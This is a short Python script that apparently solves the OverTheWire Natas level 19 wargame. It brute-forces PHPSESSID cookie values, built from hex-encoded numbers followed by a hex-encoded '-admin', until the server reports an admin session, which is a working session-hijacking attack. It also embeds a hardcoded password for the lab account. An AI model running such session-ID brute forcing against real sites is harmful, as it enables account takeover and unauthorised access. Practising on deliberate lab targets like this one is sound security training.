import requests
from requests.auth import HTTPBasicAuth
import time

flag = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
max_id = 640

# -admin in hex
username_hex = "2d61646d696e"
zero_hex = 30


for i in range(0, max_id):
    cookies = { "PHPSESSID": "".join([str(zero_hex + int(c)) for c in str(i)]) + username_hex }

    r = requests.get("http://natas19.natas.labs.overthewire.org/index.php?debug=true", auth=HTTPBasicAuth("natas19", flag), cookies = cookies)

    # print(r.text)

    if "You are an admin" in r.text:
        print(r.text)

